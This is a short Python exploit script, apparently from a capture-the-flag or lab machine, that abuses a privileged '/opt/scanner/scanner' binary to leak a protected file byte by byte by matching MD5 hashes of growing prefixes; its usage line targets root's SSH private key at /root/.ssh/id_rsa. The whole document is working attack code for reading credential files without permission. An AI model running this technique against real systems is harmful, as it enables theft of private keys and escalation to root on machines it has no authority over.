#!/usr/bin/env python3

import subprocess
import hashlib
import string
import sys

content = ''
if len(sys.argv) != 3:
    print('usage: python3 x.py /root/.ssh/id_rsa 2602')
    exit(0)

file = sys.argv[1]
size = int(sys.argv[2])

for i in range(1,size):
    cmd_output = subprocess.check_output([f'/opt/scanner/scanner -c {file} -p -s 1 -l {i}'], shell=True)
    hash_res = cmd_output.decode('utf-8').split(' ')[-1].strip()
    for j in string.printable:
        if hashlib.md5(content.encode() + j.encode()).hexdigest() == hash_res:
            content += j
            print(content,end='\r')
print()

